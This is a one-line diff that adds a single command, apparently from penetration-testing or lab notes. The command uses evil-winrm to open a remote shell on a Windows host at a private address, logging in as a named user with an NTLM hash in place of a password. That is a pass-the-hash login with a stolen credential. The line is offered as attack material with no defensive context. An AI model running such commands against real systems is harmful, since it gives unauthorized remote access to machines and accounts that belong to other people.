@@ -1,0 +1,1 @@
+evil-winrm -i 192.168.246.141 -P 59855 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
